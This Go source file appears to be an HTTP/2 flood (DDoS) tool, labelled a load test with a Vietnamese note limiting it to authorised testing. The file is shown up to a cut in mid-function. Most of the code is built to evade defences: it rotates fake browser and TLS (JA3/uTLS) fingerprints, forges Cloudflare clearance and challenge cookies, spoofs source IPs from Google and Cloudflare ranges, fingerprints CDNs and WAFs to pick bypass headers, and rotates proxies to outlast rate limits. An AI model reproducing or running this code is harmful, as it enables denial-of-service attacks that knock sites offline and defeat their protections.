// ============================================================================
// test tải (integrated bypass)
// Chỉ dùng trong môi trường được phép kiểm thử.
// ============================================================================
package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/md5"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	mrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/bogdanfinn/fhttp/http2"
	utls "github.com/bogdanfinn/utls"
	"github.com/bogdanfinn/fhttp/http2/hpack"
)

// ============================================================================
// CONFIG
// ============================================================================

type Config struct {
	Target   string
	Duration time.Duration
	Threads  int
	RPS      int
	Proxies  []string

	ShowStatus    bool
	UseBFM        bool
	UseQuery      bool
	RateLimit     bool
	UseCache      bool
	AuthProxy     bool
	ForceRandPath bool
	UseIPSpoof    bool

	// Runtime probing (auto-populated)
	Prot      Protection
	Limits    Limits
	Supported map[string]bool
	Origins   []string
	Referers  []string
	UAs       []string
	Methods   []string
	Encodings []string
	Caches    []string

	ProxyIPs []string
}

type Protection struct {
	CDN     string
	WAF     string
	Server  string
	Headers []string
}

type Limits struct {
	MaxURL         int
	MaxHeaderSize  int
	MaxHeaderCount int
	MaxCookieSize  int
	MaxBodySize    int
}

const (
	envWorker      = "H2FLOOD_WORKER"
	rotateEvery    = 5
	connsPerThread = 8
	maxConns       = 4096
	readTimeout    = 15 * time.Second
	dialTimeout    = 10 * time.Second
	sessionMinTTL  = 30 * time.Second
	sessionMaxTTL  = 120 * time.Second
	proxyReloadInt = 60 * time.Second
)

// ============================================================================
// STATIC DATA
// ============================================================================

var acceptHeaders = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"application/json,text/html;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"*/*;q=0.8",
}

var languageHeaders = []string{
	"en-US,en;q=0.9", "en-GB,en;q=0.9", "en-CA,en;q=0.9",
	"de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
	"es-ES,es;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8",
	"pt-BR,pt;q=0.9,en;q=0.8", "vi-VN,vi;q=0.9,en;q=0.8",
	"zh-CN,zh;q=0.9,en;q=0.8", "ko-KR,ko;q=0.9,en;q=0.8",
	"it-IT,it;q=0.9,en;q=0.8", "nl-NL,nl;q=0.9,en;q=0.8",
}

var encodingHeaders = []string{"gzip, deflate, br", "gzip, deflate, br, zstd", "gzip, deflate"}

var secFetchSite = []string{"same-origin", "same-site", "cross-site", "none"}
var secFetchMode = []string{"navigate", "same-origin", "no-cors", "cors"}
var secFetchDest = []string{"document", "sharedworker", "subresource", "unknown", "worker"}

var chromeUAs = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
}

var edgeUAs = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 Edg/152.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 Edg/152.0.0.0",
}

var firefoxUAs = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
}

var safariUAs = []string{
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
}

var botUAs = []string{
	"Googlebot/2.1 (+http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Twitterbot/1.0",
	"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
	"GPTBot/1.0 (+https://openai.com/gptbot)",
	"ChatGPT-User/1.0 (+https://openai.com/bot)",
	"Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
	"Discordbot/2.0 (+https://discordapp.com)",
}

var pathExtensions = []string{
	".html", ".htm", ".css", ".js", ".jpg", ".jpeg", ".png", ".gif", ".svg",
	".webp", ".woff", ".woff2", ".ttf", ".otf", ".ico", ".json", ".xml",
}

var randomPathPrefixes = []string{
	"", "admin", "wp-admin", "login", "api", "user", "dashboard", "static",
	"assets", "images", "css", "js", "upload", "download", "public",
	"auth", "panel", "cms", "blog", "post", "product", "shop", "cart",
}

var originHosts = []string{
	"https://www.google.com", "https://www.bing.com", "https://www.facebook.com",
	"https://twitter.com", "https://www.reddit.com", "https://www.youtube.com",
}

var referers = []string{
	"https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
	"https://www.facebook.com/", "https://twitter.com/", "https://www.reddit.com/",
	"https://www.linkedin.com/", "https://www.youtube.com/",
}

var cacheControlVariants = []string{
	"no-cache, no-store, must-revalidate, max-age=0",
	"max-age=0, no-cache, no-store, must-revalidate",
	"no-store, no-cache, must-revalidate, proxy-revalidate",
	"no-cache, must-revalidate, proxy-revalidate, max-age=0",
}

var timezones = []string{
	"America/New_York", "America/Los_Angeles", "Europe/London", "Europe/Berlin",
	"Asia/Tokyo", "Asia/Shanghai", "Australia/Sydney", "Asia/Dubai",
	"America/Sao_Paulo", "Africa/Johannesburg", "Asia/Ho_Chi_Minh", "Asia/Singapore",
}

var webglRenderers = []string{
	"ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11-0)",
	"ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0, D3D11)",
	"ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0, D3D11)",
	"ANGLE (Apple, Apple M1 Pro Metal Renderer)",
	"ANGLE (Intel Inc., Intel(R) UHD Graphics 630, OpenGL 4.6)",
	"ANGLE (NVIDIA Corporation, NVIDIA GeForce RTX 2080 Ti, OpenGL 4.6)",
	"ANGLE (Qualcomm, Adreno (TM) 640, OpenGL ES 3.2)",
	"ANGLE (ARM, Mali-G78, OpenGL ES 3.2)",
}

type screenSize struct{ W, H, AW, AH, CD int }

var screenSizes = []screenSize{
	{1366, 768, 1366, 728, 24},
	{1920, 1080, 1920, 1040, 30},
	{2560, 1440, 2560, 1400, 24},
	{3840, 2160, 3840, 2100, 30},
	{1440, 900, 1440, 860, 24},
	{1280, 1024, 1280, 984, 24},
	{1600, 900, 1600, 860, 24},
}

var ipSpoofSubnets = []string{
	"8.8.8.", "1.1.1.", "172.217.", "31.13.", "157.240.",
	"104.244.", "199.16.", "172.64.", "104.18.", "13.107.21.",
}

const alnumChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
const lowerChars = "aqwertyuiopsdfghjlkzxcvbnm"

func randStr(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = alnumChars[mrand.Intn(len(alnumChars))]
	}
	return string(b)
}

func randLower(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = lowerChars[mrand.Intn(len(lowerChars))]
	}
	return string(b)
}

func pick(s []string) string { return s[mrand.Intn(len(s))] }

func randHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

func randInt(min, max int) int { return mrand.Intn(max-min+1) + min }

func randFloat() float64 { return mrand.Float64() }

func generateLegitIP() string {
	return fmt.Sprintf("%s%d", ipSpoofSubnets[mrand.Intn(len(ipSpoofSubnets))], mrand.Intn(255))
}

var chromeVerRe = regexp.MustCompile(`Chrome/(\d+)`)
var edgeVerRe = regexp.MustCompile(`Edg/(\d+)`)

func uaChromeVersion(ua string) int {
	if m := chromeVerRe.FindStringSubmatch(ua); len(m) == 2 {
		if v, err := strconv.Atoi(m[1]); err == nil {
			return v
		}
	}
	if m := edgeVerRe.FindStringSubmatch(ua); len(m) == 2 {
		if v, err := strconv.Atoi(m[1]); err == nil {
			return v
		}
	}
	return 152
}

// ============================================================================
// FINGERPRINT
// ============================================================================

type Fingerprint struct {
	UA            string
	AcceptLang    string
	Timezone      string
	TZOffset      int
	ViewportW     int
	ViewportH     int
	Screen        screenSize
	DeviceMem     string
	DPR           string
	Browser       string
	ClientHelloID utls.ClientHelloID
	WebGL         string
	Canvas        string
	JA3Hash       string
}

var ja3Strings = map[string]string{
	"chrome":  "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,35-18-16-43-65037-23-5-51-65281-0-27-45-11-10-13-17613,4588-29-23-24,0",
	"firefox": "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-16-5-34-18-51-43-13-45-28-27-65037-41,4588-29-23-24-25-256-257,0",
	"edge":    "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,35-18-16-43-65037-23-5-51-65281-0-27-45-11-10-13-17613,4588-29-23-24,0",
	"safari":  "771,4865-4866-4867-49196-49195-52393-49200-49199-52392-49162-49161-49172-49171-157-156-53-47-49160-49170-10,0-23-65281-10-11-16-5-13-18-51-45-43-27-21,29-23-24-25,0",
}

func computeJA3Hash(browser string) string {
	s, ok := ja3Strings[browser]
	if !ok {
		s = ja3Strings["chrome"]
	}
	h := md5.Sum([]byte(s))
	return hex.EncodeToString(h[:])
}

func pickUA(browser string) string {
	switch browser {
	case "firefox":
		return pick(firefoxUAs)
	case "edge":
		return pick(edgeUAs)
	case "safari":
		return pick(safariUAs)
	default:
		return pick(chromeUAs)
	}
}

// pickClientHelloForUA - TLS ClientHello khớp với UA version, tránh mismatch.
func pickClientHelloForUA(ua string) utls.ClientHelloID {
	switch {
	case strings.Contains(ua, "Firefox/135"):
		return utls.HelloFirefox_120 // [COMPAT-SHIM] HelloFirefox_135 not in public utls
	case strings.Contains(ua, "Firefox/120"):
		return utls.HelloFirefox_120
	case strings.Contains(ua, "Edg/152"):
		return utls.HelloEdge_106
	case strings.Contains(ua, "Chrome/152"):
		return utls.HelloChrome_120
	case strings.Contains(ua, "Chrome/144"):
		return utls.HelloChrome_120
	case strings.Contains(ua, "Safari/17"):
		return utls.HelloSafari_16_0
	default:
		return utls.HelloChrome_Auto
	}
}

func newFingerprint(browser string) Fingerprint {
	sc := screenSizes[mrand.Intn(len(screenSizes))]
	ua := pickUA(browser)
	return Fingerprint{
		UA:            ua,
		AcceptLang:    pick(languageHeaders),
		Timezone:      pick(timezones),
		TZOffset:      randInt(-720, 720),
		ViewportW:     randInt(800, sc.W),
		ViewportH:     randInt(600, sc.H),
		Screen:        sc,
		DeviceMem:     pick([]string{"4", "8", "16"}),
		DPR:           fmt.Sprintf("%.1f", randFloat()+1),
		Browser:       browser,
		ClientHelloID: pickClientHelloForUA(ua),
		WebGL:         pick(webglRenderers),
		Canvas:        randHex(8),
		JA3Hash:       computeJA3Hash(browser),
	}
}

// ============================================================================
// COOKIE JAR (enhanced: domain/path/expiry)
// ============================================================================

type Cookie struct {
	Name    string
	Value   string
	Domain  string
	Path    string
	Expires time.Time
	Secure  bool
}

type CookieJar struct {
	mu      sync.RWMutex
	cookies map[string]Cookie // key = domain|path|name
}

func NewCookieJar() *CookieJar {
	return &CookieJar{cookies: make(map[string]Cookie)}
}

func ckey(domain, path, name string) string {
	return domain + "|" + path + "|" + name
}

func (cj *CookieJar) Set(c Cookie) {
	if c.Path == "" {
		c.Path = "/"
	}
	cj.mu.Lock()
	cj.cookies[ckey(c.Domain, c.Path, c.Name)] = c
	cj.mu.Unlock()
}

// SetFromHeader parses Set-Cookie header value; associates to defaultDomain.
func (cj *CookieJar) SetFromHeader(v, defaultDomain string) {
	parts := strings.Split(v, ";")
	if len(parts) == 0 {
		return
	}
	kv := strings.TrimSpace(parts[0])
	eq := strings.IndexByte(kv, '=')
	if eq <= 0 {
		return
	}
	c := Cookie{
		Name:   strings.TrimSpace(kv[:eq]),
		Value:  strings.TrimSpace(kv[eq+1:]),
		Domain: defaultDomain,
		Path:   "/",
	}
	for _, attr := range parts[1:] {
		attr = strings.TrimSpace(attr)
		low := strings.ToLower(attr)
		switch {
		case strings.HasPrefix(low, "domain="):
			c.Domain = strings.TrimPrefix(attr, "domain=")
			c.Domain = strings.TrimPrefix(c.Domain, "Domain=")
		case strings.HasPrefix(low, "path="):
			c.Path = strings.TrimPrefix(attr, "path=")
			c.Path = strings.TrimPrefix(c.Path, "Path=")
		case strings.HasPrefix(low, "expires="):
			if t, err := http.ParseTime(strings.TrimPrefix(attr, "expires=")); err == nil {
				c.Expires = t
			}
		case low == "secure":
			c.Secure = true
		}
	}
	cj.Set(c)
}

func (cj *CookieJar) Has(name string) bool {
	cj.mu.RLock()
	defer cj.mu.RUnlock()
	for _, c := range cj.cookies {
		if c.Name == name {
			return true
		}
	}
	return false
}

func (cj *CookieJar) String(host string) string {
	cj.mu.RLock()
	defer cj.mu.RUnlock()
	if len(cj.cookies) == 0 {
		return ""
	}
	priority := []string{"cf_clearance", "__cf_bm", "cf_chl_2", "cf_chl_prog", "cf_chl_3", "cf_ob_info"}
	seen := map[string]bool{}
	parts := make([]string, 0, len(cj.cookies))
	now := time.Now()
	for _, p := range priority {
		for _, c := range cj.cookies {
			if c.Name == p && !c.Expires.Before(now) {
				if host == "" || c.Domain == "" || strings.HasSuffix(host, c.Domain) || c.Domain == host {
					parts = append(parts, c.Name+"="+c.Value)
					seen[c.Name] = true
				}
			}
		}
	}
	rest := []string{}
	for _, c := range cj.cookies {
		if seen[c.Name] || c.Expires.Before(now) {
			continue
		}
		if host != "" && c.Domain != "" && !strings.HasSuffix(host, c.Domain) && c.Domain != host {
			continue
		}
		rest = append(rest, c.Name+"="+c.Value)
	}
	sort.Strings(rest)
	parts = append(parts, rest...)
	return strings.Join(parts, "; ")
}

func (cj *CookieJar) SeedFromString(s, domain string) {
	for _, kv := range strings.Split(s, ";") {
		kv = strings.TrimSpace(kv)
		if kv == "" {
			continue
		}
		eq := strings.IndexByte(kv, '=')
		if eq <= 0 {
			continue
		}
		cj.Set(Cookie{
			Name:    strings.TrimSpace(kv[:eq]),
			Value:   strings.TrimSpace(kv[eq+1:]),
			Domain:  domain,
			Path:    "/",
			Expires: time.Now().Add(1 * time.Hour), // FIX C1: seed cookie phải có Expires tương lai
		})
	}
}

func generateCFCookies() string {
	ts := time.Now().Unix()
	clearance := fmt.Sprintf("cf_clearance=%s.%s.%d-%s", randHex(16), randStr(4), ts, randStr(8))
	bm := fmt.Sprintf("__cf_bm=%s-%d-%s", randHex(20), ts, randStr(6))
	return clearance + "; " + bm
}

func generateBFMCookies() string {
	ts := time.Now().Unix()
	clearance := fmt.Sprintf("cf_clearance=%s.%d-%s-1.2.1.1-%s",
		randHex(16), ts, randHex(16),
		base64.RawURLEncoding.EncodeToString([]byte(randStr(24))))
	bm := fmt.Sprintf("__cf_bm=%s-%d-1.0.1.1-%s",
		base64.RawURLEncoding.EncodeToString([]byte(randStr(24))), ts,
		base64.RawURLEncoding.EncodeToString([]byte(randStr(12))))
	chl2 := "cf_chl_2=" + randStr(10)
	chlprog := fmt.Sprintf("cf_chl_prog=x%d", randInt(1, 19))
	chl3 := "cf_chl_3=" + randStr(16)
	ob := "cf_ob_info=" + randStr(20)
	return strings.Join([]string{clearance, bm, chl2, chlprog, chl3, ob}, "; ")
}

// ============================================================================
// BACKOFF STRATEGY
// ============================================================================

type BackoffStrategy string

const (
	backoffFixed             BackoffStrategy = "fixed"
	backoffLinear            BackoffStrategy = "linear"
	backoffExponential       BackoffStrategy = "exponential"
	backoffExponentialJitter BackoffStrategy = "exponentialJitter"
	backoffFibonacci         BackoffStrategy = "fibonacci"
	backoffPolynomial        BackoffStrategy = "polynomial"
	backoffRetryAfter        BackoffStrategy = "retryAfter"
)

var allBackoffStrategies = []BackoffStrategy{
	backoffFixed, backoffLinear, backoffExponential,
	backoffExponentialJitter, backoffFibonacci, backoffPolynomial, backoffRetryAfter,
}

const backoffMaxDelay = 10 * time.Second

func fibAtAttempt(attempt int) int64 {
	if attempt < 0 {
		attempt = 0
	}
	var a, b int64 = 0, 1
	for i := 0; i < attempt; i++ {
		a, b = b, a+b
		if b > 1_000_000 {
			return 1_000_000
		}
	}
	return b
}

func computeBackoffDelay(s BackoffStrategy, attempt int, retryAfter time.Duration) time.Duration {
	if attempt < 1 {
		attempt = 1
	}
	capped := attempt
	if capped > 20 {
		capped = 20
	}
	var d time.Duration
	switch s {
	case backoffFixed:
		d = 1000 * time.Millisecond
	case backoffLinear:
		d = time.Duration(1000*attempt) * time.Millisecond
	case backoffExponential:
		d = time.Duration(500*(1<<capped)) * time.Millisecond
	case backoffExponentialJitter:
		base := float64(int(500) << capped)
		jitter := 0.5 + mrand.Float64()*0.5
		d = time.Duration(base*jitter) * time.Millisecond
	case backoffFibonacci:
		d = time.Duration(1000*fibAtAttempt(attempt)) * time.Millisecond
	case backoffPolynomial:
		d = time.Duration(500*attempt*attempt) * time.Millisecond
	case backoffRetryAfter:
		if retryAfter > 0 {
			return retryAfter
		}
		d = 1000 * time.Millisecond
	default:
		d = 1000 * time.Millisecond
	}
	if d > backoffMaxDelay {
		d = backoffMaxDelay
	}
	if d < 0 {
		d = 0
	}
	return d
}

func pickBackoff(s []BackoffStrategy) BackoffStrategy { return s[mrand.Intn(len(s))] }

func parseRetryAfter(s string) time.Duration {
	s = strings.TrimSpace(s)
	if s == "" {
		return 0
	}
	if secs, err := strconv.Atoi(s); err == nil && secs > 0 {
		return time.Duration(secs) * time.Second
	}
	return 0
}

// ============================================================================
// PROXY STATE
// ============================================================================

type ProxyState struct {
	URL     string
	Browser string

	BaseRPS int
	rps     atomic.Int32

	forbidden403 atomic.Uint64
	rateLimited  atomic.Uint64
	statusCounts sync.Map

	blockedUntil atomic.Int64
	backoffUntil atomic.Int64
	backoffCount atomic.Uint64

	last429Time atomic.Int64
	lastRecover atomic.Int64

	factor       atomic.Int64
	last429Fac   atomic.Int64
	lastRecovery atomic.Int64

	requestCount atomic.Uint64

	fpMu sync.RWMutex
	fp   Fingerprint

	jar *CookieJar

	sessionMu sync.Mutex
	session   *Session
}

const (
	factorScale    = 1000
	factorMin      = 150
	factorStepDown = 500
	factorStepUp   = 50
	factorRecover  = int64(30 * time.Second)
)

func NewProxyState(proxyURL string, baseRPS int, browser, targetHost string) *ProxyState {
	ps := &ProxyState{URL: proxyURL, BaseRPS: baseRPS, Browser: browser}
	ps.rps.Store(int32(baseRPS))
	ps.fp = newFingerprint(browser)
	ps.jar = NewCookieJar()
	ps.jar.SeedFromString(generateCFCookies(), targetHost)
	ps.lastRecover.Store(time.Now().UnixNano())
	ps.factor.Store(factorScale)
	ps.lastRecovery.Store(time.Now().UnixNano())
	ps.session = NewSession(browser, targetHost, ps.jar)
	return ps
}

func (ps *ProxyState) rotateFingerprint() {
	ps.fpMu.Lock()
	ps.fp = newFingerprint(ps.Browser)
	ps.fpMu.Unlock()
}

func (ps *ProxyState) maybeRotate() {
	n := ps.requestCount.Add(1)
	if int(n)%rotateEvery == 0 {
		ps.rotateFingerprint()
	}
}

func (ps *ProxyState) currentRPS() int {
	v := int(ps.rps.Load())
	if v < 1 {
		return 1
	}
	return v
}

func (ps *ProxyState) effectiveRPS() int {
	base := ps.currentRPS()
	f := ps.recoverFactor()
	eff := base * f / factorScale
	if eff < 1 {
		eff = 1
	}
	return eff
}

func (ps *ProxyState) reduceRPS() {
	for {
		cur := ps.rps.Load()
		if cur <= 1 {
			return
		}
		next := cur / 2
		if next < 1 {
			next = 1
		}
		if ps.rps.CompareAndSwap(cur, next) {
			ps.last429Time.Store(time.Now().UnixNano())
			return
		}
	}
}

func (ps *ProxyState) recoverRPS() {
	last := ps.last429Time.Load()
	if last == 0 {
		return
	}
	now := time.Now().UnixNano()
	if now-last < int64(30*time.Second) {
		return
	}
	lastR := ps.lastRecover.Load()
	if now-lastR < int64(5*time.Second) {
		return
	}
	if !ps.lastRecover.CompareAndSwap(lastR, now) {
		return
	}
	for {
		cur := ps.rps.Load()
		if int(cur) >= ps.BaseRPS {
			return
		}
		next := cur + int32(ps.BaseRPS/10)
		if next < 1 {
			next = 1
		}
		if int(next) > ps.BaseRPS {
			next = int32(ps.BaseRPS)
		}
		if ps.rps.CompareAndSwap(cur, next) {
			return
		}
	}
}

func (ps *ProxyState) reduceFactor() {
	for {
		cur := ps.factor.Load()
		next := cur * factorStepDown / factorScale
		if next < factorMin {
			next = factorMin
		}
		if ps.factor.CompareAndSwap(cur, next) {
			ps.last429Fac.Store(time.Now().UnixNano())
			ps.lastRecovery.Store(time.Now().UnixNano())
			return
		}
	}
}

func (ps *ProxyState) recoverFactor() int {
	last := ps.last429Fac.Load()
	if last == 0 {
		return factorScale
	}
	now := time.Now().UnixNano()
	if now-last < factorRecover {
		return int(ps.factor.Load())
	}
	lastR := ps.lastRecovery.Load()
	intervals := (now - lastR) / factorRecover
	if intervals < 1 {
		return int(ps.factor.Load())
	}
	if !ps.lastRecovery.CompareAndSwap(lastR, now) {
		return int(ps.factor.Load())
	}
	for {
		cur := ps.factor.Load()
		if cur >= factorScale {
			return factorScale
		}
		next := cur + factorStepUp*intervals
		if next > factorScale {
			next = factorScale
		}
		if ps.factor.CompareAndSwap(cur, next) {
			return int(next)
		}
	}
}

func (ps *ProxyState) isBlocked() bool {
	u := ps.blockedUntil.Load()
	return u != 0 && time.Now().UnixNano() < u
}

func (ps *ProxyState) isBackedOff() bool {
	u := ps.backoffUntil.Load()
	return u != 0 && time.Now().UnixNano() < u
}

func (ps *ProxyState) applyBackoffDelay(d time.Duration) {
	if d <= 0 {
		return
	}
	until := time.Now().Add(d).UnixNano()
	for {
		cur := ps.backoffUntil.Load()
		if cur >= until {
			return
		}
		if ps.backoffUntil.CompareAndSwap(cur, until) {
			return
		}
	}
}

func (ps *ProxyState) recordBackoff() { ps.backoffCount.Add(1) }

func (ps *ProxyState) recordStatus(code int) {
	v, _ := ps.statusCounts.LoadOrStore(code, new(atomic.Uint64))
	v.(*atomic.Uint64).Add(1)
}

func (ps *ProxyState) snapshot(reset bool) string {
	parts := []string{}
	ps.statusCounts.Range(func(k, v interface{}) bool {
		c := v.(*atomic.Uint64)
		n := c.Load()
		if n > 0 {
			parts = append(parts, fmt.Sprintf("%d:%d", k.(int), n))
		}
		if reset {
			c.Store(0)
		}
		return true
	})
	return strings.Join(parts, " ")
}

func (ps *ProxyState) mark403() {
	ps.forbidden403.Add(1) // FIX C5: tăng counter thay vì reset
	ps.blockedUntil.Store(time.Now().Add(1 * time.Second).UnixNano())
}

func (ps *ProxyState) mark429() {
	ps.rateLimited.Add(1)
	ps.reduceRPS()
	ps.reduceFactor()
}

func (ps *ProxyState) updateCookie(headers []string, domain string) {
	for _, h := range headers {
		ps.jar.SetFromHeader(h, domain)
	}
}

func (ps *ProxyState) getCookie(host string) string {
	return ps.jar.String(host)
}

// ============================================================================
// SESSION (fingerprint rotate theo TTL, referer chain)
// ============================================================================

type Session struct {
	Browser  string
	Host     string
	Origin   string
	Referer  string
	RefChain []string
	Created  time.Time
	TTL      time.Duration
	jar      *CookieJar
}

func buildRefererChain(host string, rng *mrand.Rand) []string {
	engines := []string{
		"https://www.google.com/search?q=" + host,
		"https://www.bing.com/search?q=" + host,
		"https://duckduckgo.com/?q=" + host,
		"https://www.yahoo.com/search?p=" + host,
	}
	chain := []string{
		engines[rng.Intn(len(engines))],
		"https://" + host + "/",
		"https://" + host + "/" + randLower(6),
		"https://" + host + "/",
	}
	return chain
}

func NewSession(browser, host string, jar *CookieJar) *Session {
	rng := mrand.New(mrand.NewSource(time.Now().UnixNano()))
	return &Session{
		Browser:  browser,
		Host:     host,
		Origin:   originHosts[rng.Intn(len(originHosts))],
		Referer:  referers[rng.Intn(len(referers))],
		RefChain: buildRefererChain(host, rng),
		Created:  time.Now(),
		TTL:      time.Duration(randInt(int(sessionMinTTL.Seconds()), int(sessionMaxTTL.Seconds()))) * time.Second,
		jar:      jar,
	}
}

func (s *Session) Evolve() bool {
	if time.Since(s.Created) < s.TTL {
		return false
	}
	rng := mrand.New(mrand.NewSource(time.Now().UnixNano()))
	s.Origin = originHosts[rng.Intn(len(originHosts))]
	s.Referer = referers[rng.Intn(len(referers))]
	s.RefChain = buildRefererChain(s.Host, rng)
	s.Created = time.Now()
	s.TTL = time.Duration(randInt(int(sessionMinTTL.Seconds()), int(sessionMaxTTL.Seconds()))) * time.Second
	return true
}

func (s *Session) NextReferer() string {
	if len(s.RefChain) == 0 {
		return s.Referer
	}
	r := s.RefChain[0]
	s.RefChain = append(s.RefChain[1:], s.RefChain[0])
	return r
}

// ============================================================================
// PROTECTION DETECTION
// ============================================================================

func doProbe(target, proxyURL string, req *http.Request) (*http.Response, error) {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	if proxyURL != "" {
		if proxy, err := url.Parse(proxyURL); err == nil {
			transport.Proxy = http.ProxyURL(proxy)
		}
	}
	client := &http.Client{Timeout: 7 * time.Second, Transport: transport}
	return client.Do(req)
}

func detectCDN(h http.Header) string {
	if h.Get("CF-Ray") != "" || h.Get("CF-Cache-Status") != "" || strings.Contains(strings.ToLower(h.Get("Server")), "cloudflare") {
		return "cloudflare"
	}
	if strings.Contains(h.Get("Server"), "Akamai") || h.Get("X-Akamai-Transformed") != "" {
		return "akamai"
	}
	if h.Get("X-Served-By") != "" || strings.Contains(h.Get("Via"), "Fastly") {
		return "fastly"
	}
	if strings.Contains(h.Get("Via"), "CloudFront") || h.Get("X-Amz-Cf-Id") != "" {
		return "aws"
	}
	if strings.Contains(h.Get("Server"), "Incapsula") || h.Get("X-CDN") == "Imperva" {
		return "imperva"
	}
	if h.Get("X-Sucuri-ID") != "" || strings.Contains(h.Get("Server"), "Sucuri") {
		return "sucuri"
	}
	return "unknown"
}

func detectWAF(h http.Header, status int) string {
	if h.Get("X-Sucuri-ID") != "" {
		return "sucuri_waf"
	}
	if h.Get("X-WAF") != "" || strings.Contains(h.Get("Server"), "ModSecurity") {
		return "modsecurity"
	}
	if h.Get("x-amzn-RequestId") != "" && status == 403 {
		return "aws_waf"
	}
	if h.Get("CF-Ray") != "" && (status == 403 || status == 503) {
		return "cloudflare_waf"
	}
	if strings.Contains(h.Get("Server"), "Akamai") && status == 403 {
		return "akamai_waf"
	}
	return "unknown"
}

func buildBypassHeaderList(cdn, waf string) []string {
	base := []string{
		"X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Client-IP",
		"X-Forwarded-Host", "X-Host", "X-Proxy-Host", "X-Forwarded-Proto",
		"X-Request-ID", "X-Requested-With", "X-HTTP-Method-Override",
		"X-Original-URL", "X-Rewrite-URL", "X-Host-Override",
	}
	specific := []string{}
	switch cdn {
	case "cloudflare":
		specific = append(specific, "CF-Connecting-IP", "CDN-Loop", "True-Client-IP")
	case "akamai":
		specific = append(specific, "X-Akamai-Transformed", "X-Original-Host")
	case "fastly":
		specific = append(specific, "Fastly-Client-IP")
	case "aws":
		specific = append(specific, "CloudFront-Forwarded-Proto")
	case "imperva":
		specific = append(specific, "X-CDN")
	case "sucuri":
		specific = append(specific, "X-Sucuri-ID")
	}
	switch waf {
	case "cloudflare_waf":
		specific = append(specific, "CF-Connecting-IP", "CDN-Loop")
	case "aws_waf":
		specific = append(specific, "X-Forwarded-Proto", "CloudFront-Forwarded-Proto")
	case "akamai_waf":
		specific = append(specific, "X-Akamai-Transformed")
	}
	all := append(base, specific...)
	seen := map[string]bool{}
	out := []string{}
	for _, h := range all {
		if !seen[h] {
			seen[h] = true
			out = append(out, h)
		}
	}
	return out
}

func detectProtection(target, proxyURL string) Protection {
	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := doProbe(target, proxyURL, req) // FIX C3
	if err != nil || resp == nil {
		return Protection{CDN: "unknown", WAF: "unknown", Server: "unknown", Headers: buildBypassHeaderList("unknown", "unknown")}
	}
	defer resp.Body.Close()
	h := resp.Header
	p := Protection{
		Server: h.Get("Server"),
	}
	p.CDN = detectCDN(h)
	p.WAF = detectWAF(h, resp.StatusCode)
	p.Headers = buildBypassHeaderList(p.CDN, p.WAF)
	return p
}

// ============================================================================
// HEADER BYPASS ENUMERATION
// ============================================================================

func buildBypassValue(name, target, proxyIP string) string {
